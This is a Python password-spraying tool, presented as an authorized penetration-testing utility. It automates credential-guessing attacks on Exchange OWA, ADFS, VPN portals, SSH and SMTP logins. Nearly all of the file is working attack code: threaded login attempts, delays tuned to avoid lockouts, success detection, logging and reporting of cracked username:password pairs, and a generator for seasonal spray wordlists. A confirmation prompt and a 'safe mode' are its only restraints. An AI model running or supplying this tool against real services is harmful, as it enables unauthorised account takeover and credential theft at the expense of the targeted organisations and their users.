#!/usr/bin/env python3
"""
Password Spraying Automation - Security Testing Tool
Purpose: Test credential reuse patterns across multiple services
Use: Security assessment, penetration testing, credential hygiene validation
"""

import requests
import time
import json
import threading
from concurrent.futures import ThreadPoolExecutor
from typing import List, Dict, Optional, Tuple
from dataclasses import dataclass
from enum import Enum
import logging
import argparse
from pathlib import Path
import hashlib
import random
import smtplib
from urllib.parse import urlparse

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('password_spraying.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class ServiceType(Enum):
    OWA = "owa"
    AD_FS = "adfs"
    VPN = "vpn"
    SSH = "ssh"
    FTP = "ftp"
    SMTP = "smtp"
    WEB_APP = "web_app"
    CUSTOM = "custom"

@dataclass
class SprayResult:
    username: str
    password: str
    service: str
    success: bool
    response_time: float
    status_code: int
    additional_info: Dict

@dataclass
class ServiceConfig:
    name: str
    service_type: ServiceType
    target_url: str
    auth_endpoint: str
    method: str  # post, get, basic_auth
    username_param: str
    password_param: str
    success_indicator: str
    failure_indicator: str
    headers: Dict
    rate_limit_delay: float

class PasswordSprayer:
    def __init__(self, config_file: str = "spray_config.json"):
        self.config = self.load_config(config_file)
        self.results = []
        self.lock = threading.Lock()
        self.stats = {
            'total_attempts': 0,
            'successful_logins': 0,
            'failed_logins': 0,
            'locked_accounts': 0,
            'start_time': None,
            'end_time': None
        }
        
    def load_config(self, config_file: str) -> Dict:
        """Load configuration from JSON file"""
        default_config = {
            "spraying": {
                "delay_between_sprays": 60,
                "max_attempts_per_password": 100,
                "lockout_threshold": 10,
                "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "timeout": 30
            },
            "safety": {
                "safe_mode": True,
                "require_confirmation": True,
                "max_threads": 5,
                "test_mode": False
            },
            "reporting": {
                "generate_reports": True,
                "save_credentials": False,
                "alert_on_success": True
            }
        }
        
        try:
            with open(config_file, 'r') as f:
                config = json.load(f)
                logger.info(f"Loaded configuration from {config_file}")
                return {**default_config, **config}
        except FileNotFoundError:
            logger.warning(f"Config file {config_file} not found, using defaults")
            return default_config
    
    def load_usernames(self, username_file: str) -> List[str]:
        """Load usernames from file"""
        try:
            with open(username_file, 'r') as f:
                usernames = [line.strip() for line in f if line.strip()]
            logger.info(f"Loaded {len(usernames)} usernames from {username_file}")
            return usernames
        except FileNotFoundError:
            logger.error(f"Username file {username_file} not found")
            return []
    
    def load_passwords(self, password_file: str) -> List[str]:
        """Load passwords from file"""
        try:
            with open(password_file, 'r') as f:
                passwords = [line.strip() for line in f if line.strip()]
            logger.info(f"Loaded {len(passwords)} passwords from {password_file}")
            return passwords
        except FileNotFoundError:
            logger.error(f"Password file {password_file} not found")
            return []
    
    def create_service_configs(self) -> Dict[str, ServiceConfig]:
        """Create service configurations for testing"""
        services = {
            "owa_exchange": ServiceConfig(
                name="Exchange OWA",
                service_type=ServiceType.OWA,
                target_url="https://outlook.office.com",
                auth_endpoint="/owa/auth.owa",
                method="post",
                username_param="username",
                password_param="password",
                success_indicator="Location",
                failure_indicator="Sign in",
                headers={
                    "User-Agent": self.config['spraying']['user_agent'],
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                rate_limit_delay=2.0
            ),
            "adfs": ServiceConfig(
                name="ADFS",
                service_type=ServiceType.AD_FS,
                target_url="https://sts.company.com",
                auth_endpoint="/adfs/ls/idpinitiatedsignon.aspx",
                method="post",
                username_param="UserName",
                password_param="Password",
                success_indicator="Workplace",
                failure_indicator="error",
                headers={
                    "User-Agent": self.config['spraying']['user_agent'],
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                rate_limit_delay=2.0
            ),
            "vpn": ServiceConfig(
                name="VPN Portal",
                service_type=ServiceType.VPN,
                target_url="https://vpn.company.com",
                auth_endpoint="/global-protect/login.esp",
                method="post",
                username_param="user",
                password_param="passwd",
                success_indicator="portal",
                failure_indicator="error",
                headers={
                    "User-Agent": self.config['spraying']['user_agent'],
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                rate_limit_delay=3.0
            )
        }
        return services
    
    def spray_owa(self, service_config: ServiceConfig, username: str, password: str) -> SprayResult:
        """Spray against Exchange OWA"""
        start_time = time.time()
        
        try:
            session = requests.Session()
            auth_url = service_config.target_url + service_config.auth_endpoint
            
            # Prepare authentication data
            auth_data = {
                service_config.username_param: username,
                service_config.password_param: password,
                "destination": service_config.target_url,
                "flags": "4"
            }
            
            response = session.post(
                auth_url,
                data=auth_data,
                headers=service_config.headers,
                timeout=self.config['spraying']['timeout'],
                allow_redirects=False
            )
            
            response_time = time.time() - start_time
            
            # Check for successful login
            success = False
            if response.status_code == 302 and "Location" in response.headers:
                if "reason" not in response.headers["Location"]:
                    success = True
            
            result = SprayResult(
                username=username,
                password=password,
                service=service_config.name,
                success=success,
                response_time=response_time,
                status_code=response.status_code,
                additional_info={
                    'response_headers': dict(response.headers),
                    'redirect_location': response.headers.get('Location', '')
                }
            )
            
            return result
            
        except Exception as e:
            response_time = time.time() - start_time
            return SprayResult(
                username=username,
                password=password,
                service=service_config.name,
                success=False,
                response_time=response_time,
                status_code=0,
                additional_info={'error': str(e)}
            )
    
    def spray_adfs(self, service_config: ServiceConfig, username: str, password: str) -> SprayResult:
        """Spray against ADFS"""
        start_time = time.time()
        
        try:
            session = requests.Session()
            auth_url = service_config.target_url + service_config.auth_endpoint
            
            # First get the login page to obtain necessary tokens
            get_response = session.get(
                auth_url,
                headers=service_config.headers,
                timeout=self.config['spraying']['timeout']
            )
            
            # Prepare authentication data (simplified)
            auth_data = {
                service_config.username_param: username,
                service_config.password_param: password,
                "AuthMethod": "FormsAuthentication"
            }
            
            response = session.post(
                auth_url,
                data=auth_data,
                headers=service_config.headers,
                timeout=self.config['spraying']['timeout'],
                allow_redirects=True
            )
            
            response_time = time.time() - start_time
            
            # Check for successful login
            success = service_config.success_indicator.lower() in response.text.lower()
            
            result = SprayResult(
                username=username,
                password=password,
                service=service_config.name,
                success=success,
                response_time=response_time,
                status_code=response.status_code,
                additional_info={
                    'response_length': len(response.text),
                    'title': self.extract_title(response.text)
                }
            )
            
            return result
            
        except Exception as e:
            response_time = time.time() - start_time
            return SprayResult(
                username=username,
                password=password,
                service=service_config.name,
                success=False,
                response_time=response_time,
                status_code=0,
                additional_info={'error': str(e)}
            )
    
    def spray_vpn(self, service_config: ServiceConfig, username: str, password: str) -> SprayResult:
        """Spray against VPN portal"""
        start_time = time.time()
        
        try:
            session = requests.Session()
            auth_url = service_config.target_url + service_config.auth_endpoint
            
            auth_data = {
                service_config.username_param: username,
                service_config.password_param: password,
                "inputStr": "",
                "protectedLogin": "false",
                "mode": "file"
            }
            
            response = session.post(
                auth_url,
                data=auth_data,
                headers=service_config.headers,
                timeout=self.config['spraying']['timeout'],
                allow_redirects=True
            )
            
            response_time = time.time() - start_time
            
            # Check for successful login
            success = service_config.success_indicator.lower() in response.text.lower()
            
            result = SprayResult(
                username=username,
                password=password,
                service=service_config.name,
                success=success,
                response_time=response_time,
                status_code=response.status_code,
                additional_info={
                    'response_length': len(response.text),
                    'server': response.headers.get('Server', '')
                }
            )
            
            return result
            
        except Exception as e:
            response_time = time.time() - start_time
            return SprayResult(
                username=username,
                password=password,
                service=service_config.name,
                success=False,
                response_time=response_time,
                status_code=0,
                additional_info={'error': str(e)}
            )
    
    def spray_ssh(self, service_config: ServiceConfig, username: str, password: str) -> SprayResult:
        """Spray against SSH service"""
        start_time = time.time()
        
        try:
            import paramiko
            
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            target_host = urlparse(service_config.target_url).netloc
            
            client.connect(
                target_host,
                username=username,
                password=password,
                timeout=self.config['spraying']['timeout'],
                banner_timeout=10
            )
            
            response_time = time.time() - start_time
            client.close()
            
            return SprayResult(
                username=username,
                password=password,
                service=service_config.name,
                success=True,
                response_time=response_time,
                status_code=0,
                additional_info={'protocol': 'SSH'}
            )
            
        except Exception as e:
            response_time = time.time() - start_time
            return SprayResult(
                username=username,
                password=password,
                service=service_config.name,
                success=False,
                response_time=response_time,
                status_code=0,
                additional_info={'error': str(e)}
            )
    
    def spray_smtp(self, service_config: ServiceConfig, username: str, password: str) -> SprayResult:
        """Spray against SMTP service"""
        start_time = time.time()
        
        try:
            target_host = urlparse(service_config.target_url).netloc
            
            server = smtplib.SMTP(target_host, 587)
            server.starttls()
            
            server.login(username, password)
            server.quit()
            
            response_time = time.time() - start_time
            
            return SprayResult(
                username=username,
                password=password,
                service=service_config.name,
                success=True,
                response_time=response_time,
                status_code=0,
                additional_info={'protocol': 'SMTP'}
            )
            
        except Exception as e:
            response_time = time.time() - start_time
            return SprayResult(
                username=username,
                password=password,
                service=service_config.name,
                success=False,
                response_time=response_time,
                status_code=0,
                additional_info={'error': str(e)}
            )
    
    def extract_title(self, html_content: str) -> str:
        """Extract title from HTML content"""
        import re
        title_match = re.search(r'<title>(.*?)</title>', html_content, re.IGNORECASE)
        return title_match.group(1) if title_match else "No title found"
    
    def spray_single_target(self, service_config: ServiceConfig, username: str, password: str) -> SprayResult:
        """Spray a single username/password against a service"""
        logger.info(f"Spraying {username}:{password} against {service_config.name}")
        
        # Select appropriate spray method based on service type
        if service_config.service_type == ServiceType.OWA:
            result = self.spray_owa(service_config, username, password)
        elif service_config.service_type == ServiceType.AD_FS:
            result = self.spray_adfs(service_config, username, password)
        elif service_config.service_type == ServiceType.VPN:
            result = self.spray_vpn(service_config, username, password)
        elif service_config.service_type == ServiceType.SSH:
            result = self.spray_ssh(service_config, username, password)
        elif service_config.service_type == ServiceType.SMTP:
            result = self.spray_smtp(service_config, username, password)
        else:
            result = SprayResult(
                username=username,
                password=password,
                service=service_config.name,
                success=False,
                response_time=0,
                status_code=0,
                additional_info={'error': 'Unsupported service type'}
            )
        
        # Update statistics
        with self.lock:
            self.stats['total_attempts'] += 1
            if result.success:
                self.stats['successful_logins'] += 1
                logger.warning(f"SUCCESS: {username}:{password} on {service_config.name}")
            else:
                self.stats['failed_logins'] += 1
            
            self.results.append(result)
        
        return result
    
    def conduct_password_spray(self, usernames: List[str], passwords: List[str], 
                             services: List[str], delay: float = 60) -> Dict:
        """Conduct password spray attack across multiple services"""
        logger.info("Starting password spray attack")
        logger.info(f"Targets: {len(usernames)} users, {len(passwords)} passwords, {len(services)} services")
        
        if self.config['safety']['require_confirmation']:
            response = input("Continue with password spraying? (y/N): ")
            if response.lower() != 'y':
                logger.info("Password spray cancelled by user")
                return {}
        
        self.stats['start_time'] = time.time()
        service_configs = self.create_service_configs()
        
        # Filter services to only those requested
        target_services = {k: v for k, v in service_configs.items() if k in services}
        
        successful_sprays = []
        
        for password in passwords:
            logger.info(f"Spraying with password: {password}")
            
            # Spray this password against all services and users
            for service_name, service_config in target_services.items():
                logger.info(f"Targeting service: {service_name}")
                
                # Use threading for concurrent spraying
                with ThreadPoolExecutor(max_workers=self.config['safety']['max_threads']) as executor:
                    futures = []
                    
                    for username in usernames[:self.config['spraying']['max_attempts_per_password']]:
                        future = executor.submit(
                            self.spray_single_target,
                            service_config, username, password
                        )
                        futures.append(future)
                    
                    # Wait for all attempts with this password to complete
                    for future in futures:
                        try:
                            result = future.result(timeout=self.config['spraying']['timeout'] + 5)
                            if result.success:
                                successful_sprays.append(result)
                        except Exception as e:
                            logger.error(f"Spray attempt failed: {e}")
                
                # Rate limiting between services
                time.sleep(service_config.rate_limit_delay)
            
            # Major delay between password changes to avoid lockouts
            logger.info(f"Waiting {delay} seconds before next password...")
            time.sleep(delay)
        
        self.stats['end_time'] = time.time()
        
        # Generate report
        report = self.generate_report(successful_sprays)
        
        logger.info("Password spray attack completed")
        logger.info(f"Successful logins: {len(successful_sprays)}")
        
        return report
    
    def generate_report(self, successful_sprays: List[SprayResult]) -> Dict:
        """Generate comprehensive spray report"""
        report = {
            'summary': {
                'total_attempts': self.stats['total_attempts'],
                'successful_logins': self.stats['successful_logins'],
                'failed_logins': self.stats['failed_logins'],
                'success_rate': (self.stats['successful_logins'] / self.stats['total_attempts'] * 100) if self.stats['total_attempts'] > 0 else 0,
                'duration_seconds': self.stats['end_time'] - self.stats['start_time'] if self.stats['end_time'] else 0
            },
            'successful_credentials': [],
            'vulnerability_assessment': {},
            'recommendations': []
        }
        
        # Process successful credentials
        for spray in successful_sprays:
            credential_info = {
                'username': spray.username,
                'password': spray.password,
                'service': spray.service,
                'response_time': spray.response_time,
                'timestamp': time.time()
            }
            report['successful_credentials'].append(credential_info)
        
        # Vulnerability assessment
        reused_passwords = {}
        for spray in successful_sprays:
            if spray.password not in reused_passwords:
                reused_passwords[spray.password] = []
            reused_passwords[spray.password].append(spray.username)
        
        report['vulnerability_assessment'] = {
            'password_reuse_count': len(reused_passwords),
            'users_with_reused_passwords': sum(len(users) for users in reused_passwords.values()),
            'most_common_passwords': sorted(reused_passwords.items(), key=lambda x: len(x[1]), reverse=True)[:5]
        }
        
        # Generate recommendations
        if report['vulnerability_assessment']['password_reuse_count'] > 0:
            report['recommendations'].extend([
                "Implement password policy enforcement",
                "Enable multi-factor authentication",
                "Conduct user security awareness training",
                "Monitor for suspicious authentication patterns",
                "Implement account lockout policies"
            ])
        
        # Save report if configured
        if self.config['reporting']['generate_reports']:
            timestamp = time.strftime("%Y%m%d_%H%M%S")
            report_file = f"password_spray_report_{timestamp}.json"
            
            with open(report_file, 'w') as f:
                json.dump(report, f, indent=2)
            
            logger.info(f"Report saved to: {report_file}")
        
        return report
    
    def test_safe_mode(self) -> bool:
        """Test safe mode functionality"""
        if self.config['safety']['safe_mode']:
            logger.info("SAFE MODE: Only testing with safe credentials")
            return True
        return False
    
    def create_safe_wordlist(self) -> List[str]:
        """Create safe password wordlist for testing"""
        safe_passwords = [
            "SafeTest123!",
            "Password123!",
            "TestPassword1!",
            "SecurityTest1!",
            "NeverGonnaGuessThis123!"
        ]
        return safe_passwords

class CredentialAnalyzer:
    """Analyze credential patterns and reuse"""
    
    def __init__(self):
        self.common_patterns = self.load_common_patterns()
    
    def load_common_patterns(self) -> Dict:
        """Load common password patterns"""
        return {
            'season_year': ['Spring2023!', 'Summer2023!', 'Winter2023!', 'Fall2023!'],
            'company_season': ['CompanySpring!', 'CompanySummer!', 'CompanyWinter!', 'CompanyFall!'],
            'month_year': ['January2023!', 'February2023!', 'March2023!', 'April2023!'],
            'simple_patterns': ['Password123!', 'Welcome123!', 'Company123!', 'Admin123!']
        }
    
    def generate_spray_list(self, base_words: List[str], patterns: List[str]) -> List[str]:
        """Generate password spray list based on patterns"""
        spray_list = []
        
        for base in base_words:
            for pattern in patterns:
                # Apply pattern transformations
                if pattern == 'season_year':
                    spray_list.extend([f"{base}Spring2023!", f"{base}Summer2023!"])
                elif pattern == 'company_season':
                    spray_list.extend([f"Company{base}!", f"{base}Company!"])
                elif pattern == 'simple_suffix':
                    spray_list.extend([f"{base}123!", f"{base}2023!", f"{base}!"])
        
        return list(set(spray_list))  # Remove duplicates
    
    def analyze_password_strength(self, password: str) -> Dict:
        """Analyze password strength"""
        score = 0
        feedback = []
        
        # Length check
        if len(password) >= 8:
            score += 1
        else:
            feedback.append("Password should be at least 8 characters")
        
        # Complexity checks
        has_upper = any(c.isupper() for c in password)
        has_lower = any(c.islower() for c in password)
        has_digit = any(c.isdigit() for c in password)
        has_special = any(not c.isalnum() for c in password)
        
        if has_upper:
            score += 1
        else:
            feedback.append("Add uppercase letters")
        
        if has_lower:
            score += 1
        else:
            feedback.append("Add lowercase letters")
        
        if has_digit:
            score += 1
        else:
            feedback.append("Add numbers")
        
        if has_special:
            score += 1
        else:
            feedback.append("Add special characters")
        
        # Common password check
        common_passwords = ['password', '123456', 'qwerty', 'letmein']
        if password.lower() in common_passwords:
            score = 0
            feedback.append("Password is too common")
        
        return {
            'score': score,
            'max_score': 5,
            'strength': 'weak' if score < 3 else 'medium' if score < 5 else 'strong',
            'feedback': feedback
        }

def main():
    """Main function for command-line usage"""
    parser = argparse.ArgumentParser(description='Password Spraying Automation Tool')
    parser.add_argument('--usernames', required=True, help='File containing usernames')
    parser.add_argument('--passwords', required=True, help='File containing passwords')
    parser.add_argument('--services', nargs='+', default=['owa_exchange', 'adfs', 'vpn'],
                       help='Services to target')
    parser.add_argument('--delay', type=float, default=60, help='Delay between password sprays')
    parser.add_argument('--config', default='spray_config.json', help='Configuration file')
    parser.add_argument('--safe-mode', action='store_true', help='Enable safe mode for testing')
    
    args = parser.parse_args()
    
    print("Password Spraying Automation Tool")
    print("FOR AUTHORIZED SECURITY TESTING ONLY")
    print("=" * 50)
    
    # Initialize sprayer
    sprayer = PasswordSprayer(args.config)
    
    # Load credentials
    usernames = sprayer.load_usernames(args.usernames)
    passwords = sprayer.load_passwords(args.passwords)
    
    if not usernames or not passwords:
        print("Error: No usernames or passwords loaded")
        return
    
    # Safe mode override
    if args.safe_mode or sprayer.config['safety']['safe_mode']:
        print("SAFE MODE ENABLED - Using safe password list")
        passwords = sprayer.create_safe_wordlist()
    
    print(f"Loaded {len(usernames)} usernames and {len(passwords)} passwords")
    print(f"Targeting services: {', '.join(args.services)}")
    print(f"Delay between sprays: {args.delay} seconds")
    
    # Confirm before proceeding
    response = input("\nContinue with password spraying? (y/N): ")
    if response.lower() != 'y':
        print("Operation cancelled")
        return
    
    # Conduct spray attack
    try:
        report = sprayer.conduct_password_spray(usernames, passwords, args.services, args.delay)
        
        # Print summary
        print("\n" + "=" * 50)
        print("PASSWORD SPRAYING SUMMARY")
        print("=" * 50)
        print(f"Total attempts: {report['summary']['total_attempts']}")
        print(f"Successful logins: {report['summary']['successful_logins']}")
        print(f"Success rate: {report['summary']['success_rate']:.2f}%")
        print(f"Duration: {report['summary']['duration_seconds']:.2f} seconds")
        
        if report['successful_credentials']:
            print("\nSUCCESSFUL CREDENTIALS:")
            for cred in report['successful_credentials']:
                print(f"  {cred['username']}:{cred['password']} on {cred['service']}")
        
        print("\nRECOMMENDATIONS:")
        for rec in report['recommendations']:
            print(f"  - {rec}")
            
    except KeyboardInterrupt:
        print("\nPassword spraying interrupted by user")
    except Exception as e:
        print(f"Error during password spraying: {e}")

if __name__ == "__main__":
    main()
